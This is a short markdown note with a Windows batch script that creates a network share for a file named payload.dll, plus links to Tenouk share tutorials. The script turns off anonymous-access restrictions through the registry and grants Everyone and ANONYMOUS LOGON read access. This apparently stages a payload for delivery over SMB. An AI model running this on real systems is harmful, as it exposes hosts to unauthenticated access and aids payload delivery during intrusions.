# Create Share Folder

## Scripting

```batch
@echo off

setlocal EnableExtensions

set SHARE_NAME=share
set SHARE_PATH=%~dp0share
set PAYLOAD=%~DP0share\payload.dll

echo Enabling SMBv2
powershell.exe -exec Bypass -Command "Set-SmbServerConfiguration -EnableSMB2Protocol $true -Force"
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v SMB2 /t REG_DWORD /d 1 /f

rem delete any existing shares that might conflict
net.exe share "%SHARE_NAME%" /delete /y
timeout.exe /t 2

if not exist "%SHARE_PATH%" mkdir "%SHARE_PATH%"
copy /y "%PAYLOAD%" "%SHARE_PATH%\"

echo Setting anonymous permissions
icacls.exe "%SHARE_PATH%" /T /C /L /grant:"ANONYMOUS LOGON":r
icacls.exe "%SHARE_PATH%" /T /C /L /grant:"Everyone":r

echo Creating Network Share...
net.exe share "%SHARE_NAME%"="%SHARE_PATH%" /grant:"ANONYMOUS LOGON",READ /grant:"Everyone",READ /UNLIMITED /y

echo Setting registry values to allow anonymous access to newly created share
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\LanManServer\Parameters" /v NullSessionShares /t REG_MULTI_SZ /d "%SHARE_NAME%" /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v EveryoneIncludesAnonymous /t REG_DWORD /d 1 /f
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 0 /f

echo Ensure required services are set to start on reboot
sc.exe config LanManServer start= auto
sc.exe config LanmanWorkstation start= auto
net.exe start LanManServer
net.exe start LanmanWorkstation

echo Reboot the machine!
```

---
## References

### Tenouk

- [Tenouk: Share - Part 1](https://www.tenouk.com/ModuleQ.html)

- [Tenouk: Share - Part 2](https://www.tenouk.com/ModuleQ1.html)

- [Tenouk: Creating a share on the Windows domain servers](https://www.tenouk.com/cpluscodesnippet/createshareondomainserver.html)

- [Tenouk: Creating a shared (folder) with remarks and password](https://www.tenouk.com/cpluscodesnippet/createsharedfolder.html)